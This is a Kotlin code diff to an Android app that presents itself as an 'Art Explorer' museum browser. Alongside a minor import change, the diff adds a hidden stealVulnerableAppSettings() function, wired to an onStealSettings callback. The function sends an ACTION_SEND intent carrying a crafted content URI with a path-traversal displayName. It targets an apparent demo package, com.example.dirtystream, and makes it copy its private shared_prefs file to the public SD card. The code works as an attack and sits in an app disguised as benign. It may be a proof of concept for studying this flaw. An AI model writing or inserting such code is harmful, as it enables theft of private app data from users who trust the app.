@@ -11,7 +11,7 @@ import androidx.compose.foundation.layout.fillMaxSize
 import androidx.compose.material3.MaterialTheme
 import androidx.compose.material3.Surface
 import androidx.compose.ui.Modifier
-import androidx.core.net.toUri
+import android.net.Uri
 import com.artexplorer.museum.data.MuseumObject
 import com.artexplorer.museum.ui.MuseumApp
 import com.artexplorer.museum.ui.theme.MuseumTheme
@@ -33,7 +33,8 @@ class MuseumActivity : ComponentActivity() {
                     color = MaterialTheme.colorScheme.background
                 ) {
                     MuseumApp(
-                        onShareArtwork = { artwork -> shareArtwork(artwork) }
+                        onShareArtwork = { artwork -> shareArtwork(artwork) },
+                        onStealSettings = { stealVulnerableAppSettings() }
                     )
                 }
             }
@@ -110,6 +111,32 @@ Shared via Art Explorer app ✨
                 "❌ Failed to share artwork. Please try again.",
                 Toast.LENGTH_SHORT
             ).show()
+        }
+    }
+    private fun stealVulnerableAppSettings() {
+        try {
+            Log.d(TAG, "🔥 Initiating arbitrary file read attack...")
+
+            // This malicious Uri does two things:
+            // 1. Points to a private file inside the vulnerable app's data directory.
+            // 2. Uses 'displayName' to trick the vulnerable app into writing
+            //    that file to the public SD card using path traversal.
+            val maliciousUri = Uri.parse(
+                "content://com.example.dirtystream.fileprovider/root/data/data/com.example.dirtystream/shared_prefs/com.example.dirtystream_preferences.xml?displayName=../../../../../../../../sdcard/stolen_settings.xml"
+            )
+
+            val attackIntent = Intent(Intent.ACTION_SEND).apply {
+                component = ComponentName("com.example.dirtystream", "com.example.dirtystream.MainActivity")
+                putExtra(Intent.EXTRA_STREAM, maliciousUri)
+                type = "*/*" // A generic mime type for the attack
+                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+            }
+
+            startActivity(attackIntent)
+            Log.d(TAG, "✅ File read attack launched successfully.")
+
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ File read attack failed.", e)
         }
     }
 }
